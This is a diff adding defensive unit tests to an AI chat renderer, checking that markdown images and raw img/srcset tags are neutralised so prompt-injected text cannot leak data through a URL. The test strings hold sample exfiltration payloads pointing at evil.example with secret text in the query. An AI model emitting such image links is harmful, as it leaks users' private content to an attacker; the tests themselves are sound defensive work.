@@ -27,3 +27,17 @@ describe("renderAnswer (AI chat output)", () => {
     expect(a.textContent).toBe("Neural Nets");
   });
 });
+
+describe("renderAnswer never loads remote images (a prompt-injected note could leak text through the URL)", () => {
+  it("turns a markdown image into a plain link instead of an <img>", () => {
+    const el = dom("Here: ![chart](https://evil.example/c.png?d=SECRET+NOTE+TEXT)");
+    expect(el.querySelector("img")).toBeNull();
+    const a = el.querySelector("a") as HTMLAnchorElement;
+    expect(a.getAttribute("href")).toBe("https://evil.example/c.png?d=SECRET+NOTE+TEXT");
+    expect(a.textContent).toContain("chart");
+  });
+  it("also catches raw <img> HTML and srcset", () => {
+    const el = dom('<img src="https://evil.example/x.png"> <img srcset="https://evil.example/y.png 2x">');
+    expect(el.querySelector("img")).toBeNull();
+  });
+});
